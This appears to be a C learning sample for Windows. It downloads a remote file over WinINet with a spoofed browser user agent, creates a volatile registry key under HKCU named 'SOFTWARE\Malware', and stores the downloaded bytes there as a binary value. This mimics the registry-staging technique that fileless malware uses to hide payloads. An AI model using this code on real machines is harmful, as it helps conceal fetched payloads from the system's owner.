#include <stdio.h>
#include <stdlib.h>

#include <windows.h>
#include <wininet.h>
#include <winbase.h>

#define abort_on_fail(__condition, ...)	\
	do {								\
		if (!(__condition)) {			\
			printf(__VA_ARGS__);		\
			exit(1);					\
		}								\
	} while (0)							

#define URL			L"https://raw.githubusercontent.com/aurelienmichaud/win_samples/main/proc.cpp"

#define USER_AGENT	L"User - Agent: Mozilla / 5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko / 20100101 Firefox / 85.0"
#define DOWNLOADED_FILE_MAX_SIZE	0x10000

unsigned char *download_file(const TCHAR *url, size_t *remote_file_size)
{
	unsigned char dl_file_buffer[DOWNLOADED_FILE_MAX_SIZE];
	unsigned char *dl_file_content;
	DWORD dl_file_size;

	HINTERNET internet_handle;
	HANDLE url_handle;

	abort_on_fail(
		NULL != (internet_handle = InternetOpen(USER_AGENT, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, INTERNET_FLAG_PRAGMA_NOCACHE)),
		"Fail InternetOpen\n");

	abort_on_fail(
		NULL != (url_handle = InternetOpenUrl(internet_handle, url, NULL, 0, INTERNET_FLAG_SECURE, NULL)),
		"Fail InternetOpenUrl\n");

	abort_on_fail(
		TRUE == InternetReadFile(url_handle, dl_file_buffer, DOWNLOADED_FILE_MAX_SIZE, &dl_file_size),
		"Could not InternetReadFile\n");

	abort_on_fail(
		NULL != (dl_file_content = (unsigned char*)malloc(dl_file_size * sizeof(*dl_file_content))),
		"Malloc error\n");

	if (remote_file_size != NULL) {
		*remote_file_size = dl_file_size;
	}

	memcpy(dl_file_content, dl_file_buffer, dl_file_size);


	printf("\n");

	return dl_file_content;
}

#define REG_NAME_MAX_SIZE	0x100
#define REG_VALUE_MAX_SIZE	0x200

int is_printable(char c)
{
	return (0x20 <= c && c <= 0x7e);
}

void print_hex_dmp(const unsigned char *dmp, size_t dmp_size, const char *prefix)
{
#define MAX_LINE		0x10
#define MAX_COL			0x08
#define HEX_BYTE_SIZE	0x02
#define HEX_ADDR_SIZE	0x08

	int i, j, col;
	char line[MAX_LINE];

	for (i = 0, col = 0; i < dmp_size; i++, col++) {

		if ((i % MAX_LINE) == 0) {
			if (col == MAX_LINE) {
				printf(" ");
				for (j = 0; j < MAX_LINE; j++) {
					printf("%c", line[j]);
				}
				printf("\n");
				col = 0;
			}
			printf("%s%0*x  ", (prefix != NULL) ? prefix : "", HEX_ADDR_SIZE, i);
		}
		else if (col == MAX_COL) {
			printf(" ");
		}

		printf("%0*x ", HEX_BYTE_SIZE, dmp[i]);

		line[i % MAX_LINE] = is_printable(dmp[i]) ? dmp[i] : '.';
	}

	if (col != 0) {
		{
			for (i = 0; i < (MAX_LINE - col); i++) {
				if (i == MAX_COL)
					printf(" ");
				for (j = 0; j < HEX_BYTE_SIZE; j++) {
					printf(" ");
				}
				printf(" ");
			}

			printf(" ");

			for (i = 0; i < col; i++) {
				printf("%c", line[i]);
			}
		}
	}

	printf("\n");

#undef HEX_ADDR_SIZE
#undef HEX_BYTE_SIZE
#undef MAX_COL
#undef MAX_LINE
}

LONG create_reg_key(HKEY base_hkey, LPCWSTR reg_key, HKEY *out_hkey)
{
	LONG ret;
	DWORD reg_key_status;

	/* Obviously need high privileges on the parent key. */
	ret = RegCreateKeyEx(base_hkey, reg_key, 0, NULL, REG_OPTION_VOLATILE, KEY_ALL_ACCESS, NULL, out_hkey, &reg_key_status);

	if (ret != ERROR_SUCCESS)
		return ret;

	return reg_key_status;
}

LONG write_bin_dmp_into_reg_key(HKEY hkey, unsigned char *bin_dmp, size_t bin_dmp_size, LPCWSTR value_name)
{
	return RegSetKeyValue(hkey, NULL, value_name, REG_BINARY, bin_dmp, bin_dmp_size);
}

#define HKEY_PATH	L"SOFTWARE\\Malware"

/* Go and see RegLoadKey */
int main(int ac, char* av[])
{
	HKEY hkey;

	size_t remote_file_size;
	unsigned char* remote_file_content;

	LONG ret;

	printf("[+] Creating or opening the registry key '%s\\%ws'...\n", "HKEY_CURRENT_USER", HKEY_PATH);
	ret = create_reg_key(HKEY_CURRENT_USER, HKEY_PATH, &hkey);

	if (ret == REG_CREATED_NEW_KEY) {

		printf("[!] Successfully created the registry key !\n\n");
		printf("[+] Downloading the file '%ws'...\n", URL);

		remote_file_content = download_file(URL, &remote_file_size);

		printf("[!] Done !\n");

		printf("\n--- BEGIN OF FILE ---\n");
		print_hex_dmp(remote_file_content, remote_file_size, "\t");
		printf("--- END OF FILE ---\n\n");

		printf("[+] Writing the downloaded file's content into the registry key as a REG_BINARY value...\n");

		ret = write_bin_dmp_into_reg_key(hkey, remote_file_content, remote_file_size, L"DlFileContent");

		if (ret != ERROR_SUCCESS) {
			if (ret == 5) {
				printf("[!] ERROR (ACCESS DENIED) while writing new binary value into the registry key.\n");
			} else {
				printf("[!] ERROR (%d) while writing new binary value into the registry key\n", ret);
			}
			exit(1);
		}

		printf("[!] Done !\n");

	} else if (ret == REG_OPENED_EXISTING_KEY) {
		printf("[!] The key did exist, it was successfully opened\n");
	} else {
		printf("[!] ERROR (%d)\n", ret);
	}

	system("pause");

	return 0;
}
